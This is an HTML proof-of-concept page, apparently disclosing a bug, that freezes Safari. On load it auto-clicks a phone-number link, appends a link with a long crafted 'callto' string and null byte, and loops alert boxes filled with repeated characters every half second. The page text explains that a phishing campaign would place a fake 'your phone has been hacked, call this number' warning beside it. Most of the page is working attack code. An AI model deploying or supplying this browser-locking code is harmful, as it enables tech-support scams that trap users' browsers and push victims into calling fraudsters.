<html>

<head>
	<title>
		Safari Hang POC
	</title>
	
	<script src="https://code.jquery/com/jquery-1.12.0.min.js"></script>
	<script src="https://code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
</head>

<body>

<h1>Safari Hang POC</h1>

<p>
You should recieve a request to call a phone number. After clicking cancel, Safari will be completely unresponsive. A phishing campaign would normally put a warning here telling you that your phone has been hacked and you must call the number to resolve the issue.
</p>

<!-- This is the target element -->
<p id="result"></p>

<!-- This initially sets up the phish -->
<script type="text/javascript">

jQuery('#result').append('<a href="tel:Safari Hang POC +1-800-555-5555"></a>');
document.querySelector('a').click();

</script>

<!-- This is the code that causes Safari to hang -->
<script type="text/javascript">

var extraData = "";
for (iterate = 0; iterate < 1000; iterate++) {
	var extraData = extraData + "5555555555";
}

jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
document.querySelector('a').click();
document.querySelector('a').click();

</script>

<!-- This is also somehow involved -->
<script type="text/javascript">

setInterval(function(){ alert('\0345'.repeat(2000));}, 500);

</script>

</body>

</html>
